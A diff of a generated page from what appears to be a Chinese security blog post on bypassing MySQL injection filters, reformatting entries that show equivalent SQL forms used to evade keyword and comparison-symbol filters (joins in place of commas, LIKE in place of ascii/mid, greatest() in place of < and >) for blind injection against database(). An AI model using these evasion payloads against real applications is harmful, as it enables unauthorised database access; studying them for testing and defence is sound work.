@@ -15,7 +15,7 @@
 <meta property="og:url" content="https://ghcdgit.github.io/2018/02/21/mysql-过滤绕过/index.html">
 <meta property="og:site_name" content="GHC&#39;s Blog">
 <meta property="og:description" content="一些绕过方法">
-<meta property="og:updated_time" content="2018-02-21T03:41:48.895Z">
+<meta property="og:updated_time" content="2018-02-21T03:52:03.139Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql 过滤绕过">
 <meta name="twitter:description" content="一些绕过方法">
@@ -195,8 +195,11 @@ or    =&gt; ||  =&gt; %7C%7C
 <p>union select 1,2     #等价于<br>union select * from (select 1)a join (select 2)b</p>
 <p>select ascii(mid(user(),1,1))=80   #等价于<br>select user() like ‘r%’</p>
 <p>select ascii(mid(user(),1,1))=80   #等价于<br>select user() like ‘r%’</p>
-<p>select <em> from news limit 0,1<br>#等价于下面这条SQL语句<br>select </em> from news limit 1 offset 0</p>
-<h4 id="10-比较符号-lt-gt-过滤"><a href="#10-比较符号-lt-gt-过滤" class="headerlink" title="10.比较符号(&lt;&gt;)过滤"></a>10.比较符号(&lt;&gt;)过滤</h4><p>使用 greatest(),least() #前者返回最大值，后者返回最小值<br>select <em> from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select </em> from users where id=1 and greatest(ascii(substr(<br>database(),0,1)),64)=64</p>
+<p>select * from news limit 0,1<br>#等价于下面这条SQL语句<br>select  * from news limit 1 offset 0</p>
+</blockquote>
+<h4 id="10-过滤（-lt-gt-）绕过"><a href="#10-过滤（-lt-gt-）绕过" class="headerlink" title="10.过滤（&lt;&gt;）绕过"></a>10.过滤（&lt;&gt;）绕过</h4><p>使用 greatest(),least() #前者返回最大值，后者返回最小值</p>
+<blockquote>
+<p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p>
 </blockquote>
 
       
